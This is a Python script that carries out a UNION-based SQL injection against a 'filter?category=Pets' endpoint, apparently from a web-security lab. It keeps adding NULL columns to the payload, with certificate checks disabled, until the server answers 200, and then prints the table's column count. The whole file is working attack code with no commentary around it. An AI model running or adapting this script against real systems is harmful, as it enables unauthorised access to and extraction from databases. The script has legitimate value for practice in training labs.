import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def exploit_sqli_column_number(url):
    path = "filter?category=Pets"
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        print("Attack "+str(i)+": "+url+path+sql_payload+"--")
        r = requests.get(url+path+sql_payload+"--", verify=False)
        if r.status_code == 200: #also can evaluate 500 status code
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1    
        
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns....")
    num_col = exploit_sqli_column_number(url)
    print(num_col)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
    else:
        print("[-] The SQLi attack was not successful.")
